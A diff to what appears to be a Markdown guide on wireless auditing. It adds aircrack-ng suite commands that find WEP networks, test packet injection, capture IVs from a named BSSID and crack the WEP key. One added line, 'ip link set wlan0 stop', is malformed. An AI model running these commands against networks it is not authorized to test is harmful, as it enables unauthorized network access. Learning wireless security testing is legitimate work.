@@ -147,17 +147,28 @@ sudo apt install aircrack-ng pciutils
 * Set the adapter in monitor mode :
 ```
 sudo airmon-ng
+sudo ip link set wlan0 stop
 sudo airmon-ng start wlan0
 ```
 
-* Start to capture packets with `airodump-ng` :
+* Search WEP networks with `airodump-ng` :
 ```
-sudo airodump-ng wlan0
+sudo airodump-ng wlan0 --encrypt WEP
 ```
 
-* Check if monitor mode is successfully enabled on `wlan0` interface :
+* Test wireless packet injection :
 ```
-ip a
+sudo aireplay-ng -9 -e [SSID] -a [BSSID] --ignore-negative-one wlan0
+```
+
+* Capture IVs and decode WEP key :
+```
+sudo besside-ng -c 11 -b 82:A9:40:96:BE:48 wlan0
+```
+
+* Launch `aircrack-ng` to crack WEP key :
+```
+sudo aircrack-ng wep.cap
 ```
 
 * Disable monitor mode on `wlan0` interface :
